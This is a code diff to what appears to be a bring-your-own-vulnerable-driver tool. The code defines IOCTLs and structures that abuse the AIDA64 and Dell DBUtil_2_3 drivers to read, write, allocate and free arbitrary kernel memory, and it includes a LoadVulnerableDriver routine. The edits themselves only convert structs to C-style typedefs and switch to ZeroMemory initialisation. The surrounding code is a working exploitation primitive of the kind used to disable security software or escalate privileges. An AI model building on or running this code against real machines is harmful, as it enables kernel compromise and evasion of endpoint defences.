@@ -44,32 +44,32 @@ static DriverInfo* g_ActiveDriver = nullptr;
 #define IOCTL_READ_MEMORY  CTL_CODE(FILE_DEVICE_UNKNOWN, 0x801, METHOD_BUFFERED, FILE_ANY_ACCESS)
 #define IOCTL_WRITE_MEMORY CTL_CODE(FILE_DEVICE_UNKNOWN, 0x802, METHOD_BUFFERED, FILE_ANY_ACCESS)
 
-// Structures (C++ style - no typedef needed)
+// Structures
 #pragma pack(push, 1)
-struct MEMORY_OPERATION {
+typedef struct _MEMORY_OPERATION {
     UINT64 address;
     PVOID buffer;
     SIZE_T size;
     UINT64 result;
-};
+} MEMORY_OPERATION, *PMEMORY_OPERATION;
 
-struct AIDA64_PHYS_MEM_IO {
+typedef struct _AIDA64_PHYS_MEM_IO {
     UINT64 PhysicalAddress;
     UINT32 Size;
     UINT32 Value;
-};
+} AIDA64_PHYS_MEM_IO, *PAIDA64_PHYS_MEM_IO;
 
-struct AIDA64_MAP_PHYS_MEM {
+typedef struct _AIDA64_MAP_PHYS_MEM {
     UINT64 PhysicalAddress;
     UINT32 Size;
     UINT64 VirtualAddress;
-};
+} AIDA64_MAP_PHYS_MEM, *PAIDA64_MAP_PHYS_MEM;
 
-struct DBUTIL_READ_WRITE {
+typedef struct _DBUTIL_READ_WRITE {
     UINT64 address;
     UINT32 value;
     UINT32 size;
-};
+} DBUTIL_READ_WRITE, *PDBUTIL_READ_WRITE;
 #pragma pack(pop)
 
 bool LoadVulnerableDriver() {
@@ -282,7 +282,8 @@ bool ReadKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
         while (remaining > 0) {
             UINT32 chunkSize = (remaining >= 4) ? 4 : (UINT32)remaining;
 
-            AIDA64_PHYS_MEM_IO io = {};
+            AIDA64_PHYS_MEM_IO io;
+            ZeroMemory(&io, sizeof(io));
             io.PhysicalAddress = currentAddr;
             io.Size = chunkSize;
 
@@ -310,7 +311,8 @@ bool ReadKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
 
     // DBUtil specific implementation
     if (strcmp(g_ActiveDriver->name, "DBUtil_2_3") == 0) {
-        DBUTIL_READ_WRITE dbOp = {};
+        DBUTIL_READ_WRITE dbOp;
+        ZeroMemory(&dbOp, sizeof(dbOp));
         dbOp.address = address;
         dbOp.size = (UINT32)size;
 
@@ -328,7 +330,8 @@ bool ReadKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
     }
 
     // Generic method for other drivers
-    MEMORY_OPERATION op = {};
+    MEMORY_OPERATION op;
+    ZeroMemory(&op, sizeof(op));
     op.address = address;
     op.buffer = buffer;
     op.size = size;
@@ -360,7 +363,8 @@ bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
         while (remaining > 0) {
             UINT32 chunkSize = (remaining >= 4) ? 4 : (UINT32)remaining;
 
-            AIDA64_PHYS_MEM_IO io = {};
+            AIDA64_PHYS_MEM_IO io;
+            ZeroMemory(&io, sizeof(io));
             io.PhysicalAddress = currentAddr;
             io.Size = chunkSize;
             memcpy(&io.Value, byteBuffer, chunkSize);
@@ -390,7 +394,8 @@ bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
 
     // DBUtil specific implementation
     if (strcmp(g_ActiveDriver->name, "DBUtil_2_3") == 0) {
-        DBUTIL_READ_WRITE dbOp = {};
+        DBUTIL_READ_WRITE dbOp;
+        ZeroMemory(&dbOp, sizeof(dbOp));
         dbOp.address = address;
         dbOp.size = (UINT32)size;
 
@@ -417,7 +422,8 @@ bool WriteKernelMemory(UINT64 address, PVOID buffer, SIZE_T size) {
     }
 
     // Generic method for other drivers
-    MEMORY_OPERATION op = {};
+    MEMORY_OPERATION op;
+    ZeroMemory(&op, sizeof(op));
     op.address = address;
     op.buffer = buffer;
     op.size = size;
@@ -448,7 +454,8 @@ UINT64 AllocateKernelMemory(SIZE_T size) {
 
     // AIDA64 uses physical memory mapping instead of allocation
     if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
-        AIDA64_MAP_PHYS_MEM mapOp = {};
+        AIDA64_MAP_PHYS_MEM mapOp;
+        ZeroMemory(&mapOp, sizeof(mapOp));
         mapOp.PhysicalAddress = 0;
         mapOp.Size = (UINT32)size;
 
@@ -477,7 +484,8 @@ UINT64 AllocateKernelMemory(SIZE_T size) {
     }
 
     // Generic allocation for other drivers
-    MEMORY_OPERATION op = {};
+    MEMORY_OPERATION op;
+    ZeroMemory(&op, sizeof(op));
     op.size = size;
 
     DWORD bytesReturned = 0;
@@ -505,7 +513,8 @@ bool FreeKernelMemory(UINT64 address) {
 
     // AIDA64 uses unmap
     if (strcmp(g_ActiveDriver->name, "aida64") == 0) {
-        AIDA64_MAP_PHYS_MEM unmapOp = {};
+        AIDA64_MAP_PHYS_MEM unmapOp;
+        ZeroMemory(&unmapOp, sizeof(unmapOp));
         unmapOp.VirtualAddress = address;
 
         DWORD bytesReturned = 0;
@@ -522,7 +531,8 @@ bool FreeKernelMemory(UINT64 address) {
     }
 
     // Generic free for other drivers
-    MEMORY_OPERATION op = {};
+    MEMORY_OPERATION op;
+    ZeroMemory(&op, sizeof(op));
     op.address = address;
 
     DWORD bytesReturned = 0;
